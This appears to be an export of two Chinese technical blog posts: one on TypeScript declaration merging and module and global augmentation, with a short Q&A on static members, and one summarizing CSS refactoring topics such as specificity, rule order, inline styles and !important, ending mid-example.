<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Document</span> &#123;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="built_in">any</span>): <span class="title class_">Element</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Document</span> &#123;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="string">&quot;div&quot;</span>): <span class="title class_">HTMLDivElement</span>;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="string">&quot;span&quot;</span>): <span class="title class_">HTMLSpanElement</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Document</span> &#123;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="built_in">string</span>): <span class="title class_">HTMLElement</span>;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="string">&quot;canvas&quot;</span>): <span class="title class_">HTMLCanvasElement</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成的合并声明<code>Document</code>如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Document</span> &#123;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="string">&quot;canvas&quot;</span>): <span class="title class_">HTMLCanvasElement</span>;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="string">&quot;div&quot;</span>): <span class="title class_">HTMLDivElement</span>;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="string">&quot;span&quot;</span>): <span class="title class_">HTMLSpanElement</span>;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="built_in">string</span>): <span class="title class_">HTMLElement</span>;</span><br><span class="line">  <span class="title function_">createElement</span>(<span class="attr">tagName</span>: <span class="built_in">any</span>): <span class="title class_">Element</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="合并命名空间"><a href="#合并命名空间" class="headerlink" title="合并命名空间"></a>合并命名空间</h3><p>与接口类似，同名的命名空间也会合并它们的成员。由于命名空间同时创建命名空间和值，我们需要了解两者如何合并。</p>
<p>为了合并命名空间，每个命名空间中声明的导出接口的类型定义本身被合并，形成一个内部具有合并接口定义的命名空间。</p>
<p>要合并名称空间值，在每个声明站点，如果已存在具有给定名称的名称空间，则通过采用现有名称空间并<strong>将第二个名称空间的导出成员添加到第一个名称空间</strong>来进一步扩展它。</p>
<p>本例中的声明合并<code>Animals</code>：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Animals</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Zebra</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Animals</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">Legged</span> &#123;</span><br><span class="line">    <span class="attr">numberOfLegs</span>: <span class="built_in">number</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Animals</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">Legged</span> &#123;</span><br><span class="line">    <span class="attr">numberOfLegs</span>: <span class="built_in">number</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Zebra</span> &#123;&#125;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种名称空间合并模型是一个有用的起点，但我们还需要了解非导出成员会发生什么。非导出成员仅在原始（未合并的）命名空间中可见。这意味着合并后，来自其他声明的合并成员看不到非导出成员。</p>
<p>我们可以在这个例子中更清楚地看到这一点：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> haveMuscles = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">animalsHaveMuscles</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> haveMuscles;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">doAnimalsHaveMuscles</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> haveMuscles; <span class="comment">// Error, because haveMuscles is not accessible here</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>haveMuscles</code>未导出，所以只有<code>animalsHaveMuscles</code>共享相同未合并命名空间的函数才能看到该符号。该<code>doAnimalsHaveMuscles</code>函数，即使它是合并<code>Animal</code>命名空间的一部分，也看不到这个未导出的成员。</p>
<h3 id="将命名空间与类、函数和枚举合并"><a href="#将命名空间与类、函数和枚举合并" class="headerlink" title="将命名空间与类、函数和枚举合并"></a>将命名空间与类、函数和枚举合并</h3><p>命名空间足够灵活，可以与其他类型的声明合并。为此，名称空间声明必须跟在它将合并的声明之后。生成的声明具有两种声明类型的属性。TypeScript 使用此功能对 JavaScript 和其他编程语言中的某些模式进行建模。</p>
<h3 id="将命名空间与类合并"><a href="#将命名空间与类合并" class="headerlink" title="将命名空间与类合并"></a>将命名空间与类合并</h3><p>这为用户提供了一种描述内部类的方法。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Album</span> &#123;</span><br><span class="line">  <span class="attr">label</span>: <span class="title class_">Album</span>.<span class="property">AlbumLabel</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Album</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AlbumLabel</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.typescriptlang.org/docs/handbook/declaration-merging.html#merging-namespaces">合并成员的可见性规则与合并命名空间</a>部分中描述的相同，因此我们必须导出类<code>AlbumLabel</code>以供合并类查看。最终结果是在另一个类内部管理一个类。您还可以使用名称空间向现有类添加更多静态成员。</p>
<p>除了内部类模式之外，您可能还熟悉创建函数然后通过向函数添加属性来进一步扩展函数的 JavaScript 实践。TypeScript 使用声明合并以类型安全的方式构建这样的定义。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">buildLabel</span>(<span class="params">name: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> buildLabel.<span class="property">prefix</span> + name + buildLabel.<span class="property">suffix</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> buildLabel &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">let</span> suffix = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">let</span> prefix = <span class="string">&quot;Hello, &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">buildLabel</span>(<span class="string">&quot;Sam Smith&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>同样，命名空间可用于扩展具有静态成员的枚举：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  red = <span class="number">1</span>,</span><br><span class="line">  green = <span class="number">2</span>,</span><br><span class="line">  blue = <span class="number">4</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">mixColor</span>(<span class="params">colorName: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (colorName == <span class="string">&quot;yellow&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Color</span>.<span class="property">red</span> + <span class="title class_">Color</span>.<span class="property">green</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (colorName == <span class="string">&quot;white&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Color</span>.<span class="property">red</span> + <span class="title class_">Color</span>.<span class="property">green</span> + <span class="title class_">Color</span>.<span class="property">blue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (colorName == <span class="string">&quot;magenta&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Color</span>.<span class="property">red</span> + <span class="title class_">Color</span>.<span class="property">blue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (colorName == <span class="string">&quot;cyan&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Color</span>.<span class="property">green</span> + <span class="title class_">Color</span>.<span class="property">blue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="不允许合并"><a href="#不允许合并" class="headerlink" title="不允许合并"></a>不允许合并</h3><p>并非所有合并都在 TypeScript 中被允许。目前，类不能与其他类或变量合并。有关模拟类合并的信息，请参阅<a href="https://www.typescriptlang.org/docs/handbook/mixins.html">TypeScript 中的混合</a>部分。</p>
<h3 id="模组扩充"><a href="#模组扩充" class="headerlink" title="模组扩充"></a>模组扩充</h3><p>尽管 JavaScript 模块不支持合并，但您可以通过导入然后更新现有对象来修补它们。让我们看一个玩具 Observable 示例：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// observable.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Observable</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="comment">// ... implementation left as an exercise for the reader ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// map.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Observable</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./observable&quot;</span>;</span><br><span class="line"><span class="title class_">Observable</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">map</span> = <span class="keyword">function</span> (<span class="params">f</span>) &#123;</span><br><span class="line">  <span class="comment">// ... another exercise for the reader</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这在 TypeScript 中也能正常工作，但编译器不知道<code>Observable.prototype.map</code>. 您可以使用模块扩充将其告知编译器：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// observable.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Observable</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="comment">// ... implementation left as an exercise for the reader ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// map.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Observable</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./observable&quot;</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;./observable&quot;</span> &#123;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">Observable</span>&lt;T&gt; &#123;</span><br><span class="line">    map&lt;U&gt;(<span class="attr">f</span>: <span class="function">(<span class="params">x: T</span>) =&gt;</span> U): <span class="title class_">Observable</span>&lt;U&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Observable</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">map</span> = <span class="keyword">function</span> (<span class="params">f</span>) &#123;</span><br><span class="line">  <span class="comment">// ... another exercise for the reader</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// consumer.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Observable</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./observable&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./map&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">o</span>: <span class="title class_">Observable</span>&lt;<span class="built_in">number</span>&gt;;</span><br><span class="line">o.<span class="title function_">map</span>(<span class="function">(<span class="params">x</span>) =&gt;</span> x.<span class="title function_">toFixed</span>());</span><br></pre></td></tr></table></figure>

<p><code>import</code>模块名称的解析方式与&#x2F;中的模块说明符相同<code>export</code>。有关详细信息，请参阅<a href="https://www.typescriptlang.org/docs/handbook/modules.html">模块。</a>然后合并扩充中的声明，就好像它们是在与原始文件相同的文件中声明的一样。</p>
<p>但是，请记住两个限制：</p>
<ol>
<li>您不能在扩充中声明新的顶级声明——只是对现有声明的补丁。</li>
<li>默认导出也不能被扩充，只能被命名为导出（因为您需要通过其导出名称来扩充导出，并且<code>default</code>是一个保留字 - 有关详细信息，请参见<a href="https://github.com/Microsoft/TypeScript/issues/14080">#14080</a>）</li>
</ol>
<h3 id="全局增强"><a href="#全局增强" class="headerlink" title="全局增强"></a>全局增强</h3><p>您还可以从模块内部向全局范围添加声明：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// observable.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Observable</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="comment">// ... still no implementation ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">global</span> &#123;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">Array</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="title function_">toObservable</span>(): <span class="title class_">Observable</span>&lt;T&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toObservable</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>全局扩充与模块扩充具有相同的行为和限制。</p>
<h2 id="issues"><a href="#issues" class="headerlink" title="issues"></a>issues</h2><h3 id="创建一个对象会做哪三件事"><a href="#创建一个对象会做哪三件事" class="headerlink" title="创建一个对象会做哪三件事"></a>创建一个对象会做哪三件事</h3><h3 id="js垃圾回收机制触发时机"><a href="#js垃圾回收机制触发时机" class="headerlink" title="js垃圾回收机制触发时机"></a>js垃圾回收机制触发时机</h3><h3 id="ts编译为es5，class编译成了立即执行函数？"><a href="#ts编译为es5，class编译成了立即执行函数？" class="headerlink" title="ts编译为es5，class编译成了立即执行函数？"></a>ts编译为es5，class编译成了立即执行函数？</h3><p>避免变量名别污染</p>
<h3 id="静态方法中只能调用静态的方法或属性？"><a href="#静态方法中只能调用静态的方法或属性？" class="headerlink" title="静态方法中只能调用静态的方法或属性？"></a>静态方法中只能调用静态的方法或属性？</h3><p>是的，跟非静态方法或属性是独立的，反之也是。</p>
<h3 id="一个静态方法改变了某个静态属性，其他静态方法或类外部任何地方访问这个属性都会发生改变？"><a href="#一个静态方法改变了某个静态属性，其他静态方法或类外部任何地方访问这个属性都会发生改变？" class="headerlink" title="一个静态方法改变了某个静态属性，其他静态方法或类外部任何地方访问这个属性都会发生改变？"></a>一个静态方法改变了某个静态属性，其他静态方法或类外部任何地方访问这个属性都会发生改变？</h3><p>是。这个非静态方法，new object有区别。</p>
<h3 id="静态属性或方法分配内存空间的时间早于对象空间的分配？"><a href="#静态属性或方法分配内存空间的时间早于对象空间的分配？" class="headerlink" title="静态属性或方法分配内存空间的时间早于对象空间的分配？"></a>静态属性或方法分配内存空间的时间早于对象空间的分配？</h3><p>是。静态属性或方法分配内存空间会一直在，直到程序执行结束才被释放。</p>
]]></content>
      <tags>
        <tag>typescript</tag>
      </tags>
  </entry>
  <entry>
    <title>精读《CSS重构：样式表性能调优》</title>
    <url>/2022/02/19/20220219-%E7%B2%BE%E8%AF%BB%E3%80%8ACSS%E9%87%8D%E6%9E%84%EF%BC%9A%E6%A0%B7%E5%BC%8F%E8%A1%A8%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98%E3%80%8B/</url>
    <content><![CDATA[<h2 id="1-怎么看待重构"><a href="#1-怎么看待重构" class="headerlink" title="1 怎么看待重构"></a>1 怎么看待重构</h2><p>仅当重构能够改善架构或使代码符合编码规范时，才应进行重构。</p>
<p>对软件项目的代码质量负责的聪明人很可能理解重构的意义，但是不能理解的人可能会持有以下意见：</p>
<ul>
<li><p>花时间重写代码，却又看不到功能上的变化，既浪费时间，又浪费钱；</p>
</li>
<li><p>如果代码还能正常工作，没必要修复；</p>
</li>
<li><p>你应该当初就把代码写正确。</p>
</li>
</ul>
<p>如果别人持有以上理由，而你对重构有足够的信心，我建议你重构代码，只要你能够保证开发进度，并且小心谨慎，不破坏其他功能。</p>
<p>不成熟的优化往往跟技术债务同样糟糕。</p>
<p><a href="https://github.com/jameskrauser/cssrefectoring-example/tree/master/Chapter%2001">重构示例</a></p>
<h2 id="2-级联"><a href="#2-级联" class="headerlink" title="2 级联"></a>2 级联</h2><p>级联是浏览器决定为元素应用哪种样式的一种方法。样式根据选择器的特指度以及规则集出现的次序起作用。</p>
<h3 id="2-1-选择器特指度"><a href="#2-1-选择器特指度" class="headerlink" title="2.1 选择器特指度"></a>2.1 选择器特指度</h3><p>计算特指度时需要分析这些选择器（除了通用选择器 *）。为(a, b, c, d) 中的各个变量赋予相应的数值，就能得到特指度。</p>
<p>(1) 如果用 style 属性应用样式，则 a&#x3D;1，否则 a&#x3D;0。</p>
<p>(2) b 为 ID 选择器的数量。</p>
<p>(3) c 为类选择器、属性选择器和伪类的数量。</p>
<p>(4) d 为类型选择器和伪元素的数量。</p>
<p>示例</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#nav-global</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">a</span><span class="selector-class">.nav-link</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以确定该选择器的特指度为<code>(0, 1, 1, 3)</code></p>
<p>(1) 样式不是用 style 属性添加的，因此 a&#x3D;0</p>
<p>(2) 只有 1 个 ID 选择器（#nav-global），因此 b&#x3D;1</p>
<p>(3) 只有 1 个类选择器（.nav-link），因此 c&#x3D;1</p>
<p>(4) 有 3 个类型选择器（ul、li 和 a），因此 d&#x3D;3</p>
<p>怎么比较呢？最左侧的选择器特指度最高。举例来说，特指度 (1, 0, 0, 0) 高于 (0, 1, 1, 3)，同理，(0, 2, 1, 3) 高于 (0, 1 ,1, 3)。</p>
<h3 id="2-2-规则集顺序"><a href="#2-2-规则集顺序" class="headerlink" title="2.2 规则集顺序"></a>2.2 规则集顺序</h3><p>如果两个声明块中的选择器特指度相同，且它们为同一元素的某个属性应用样式，那么在样式表中处于相对靠后位置的声明块中的属性优先级较高。</p>
<p>示例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Inline Styles and Specificity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#nav-global</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">a</span><span class="selector-class">.nav-link</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#nav-global</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">a</span><span class="selector-class">.nav-link</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">id</span>=<span class="string">&quot;nav-global&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果 color: #000000;</p>
<h3 id="2-3-行内-CSS-和特指度"><a href="#2-3-行内-CSS-和特指度" class="headerlink" title="2.3 行内 CSS 和特指度"></a>2.3 行内 CSS 和特指度</h3><p>不管<code>&lt;style&gt;</code>块或外部样式表中的选择器有多么精确，它们都比不上为元素添加的行内样式精确。</p>
<p>示例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Inline Styles and Specificity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#nav-global</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">a</span><span class="selector-class">.nav-link</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">id</span>=<span class="string">&quot;nav-global&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: #1200FF;&quot;</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果 color: #1200FF;</p>
<h3 id="2-4-用-important-声明覆盖级联样式"><a href="#2-4-用-important-声明覆盖级联样式" class="headerlink" title="2.4 用 !important 声明覆盖级联样式"></a>2.4 用 !important 声明覆盖级联样式</h3><p><code>&lt;style&gt;</code> 块或外部样式表中的样式，如要比其他样式（包括用 style 属性添加的行内样式）更精确，唯一的方法是在声明块中添加<code>!important</code>。多个块样式中，靠后优先级较高。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Inline Styles and Specificity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#nav-global</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">a</span><span class="selector-class">.nav-link</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#ffffff</span> <span class="meta">!important</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#nav-global</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">a</span><span class="selector-class">.nav-link</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">id</span>=<span class="string">&quot;nav-global&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: #1200FF;&quot;</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果 color: #FFFFFF</p>
<h2 id="3-编写更优质的-CSS"><a href="#3-编写更优质的-CSS" class="headerlink" title="3 编写更优质的 CSS"></a>3 编写更优质的 CSS</h2><h3 id="3-1-注释合理化"><a href="#3-1-注释合理化" class="headerlink" title="3.1 注释合理化"></a>3.1 注释合理化</h3><p>对日后的代码阅读中，有助于辅助理解。注释的内容应包括：</p>
<ul>
<li>文件内容</li>
<li>选择器的依赖、用法等</li>
<li>使用特定声明的原因（因为浏览器的怪癖而使用时，予以说明帮助尤为大）</li>
<li>正被重构的、不应该继续使用的废弃样式</li>
</ul>
<p>示例</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 主导航链接的样式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @see templates/_navigation.html</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-link</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-link</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">4px</span> solid <span class="number">#000000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 防止因增加了4px下边框而导致元素移动</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span 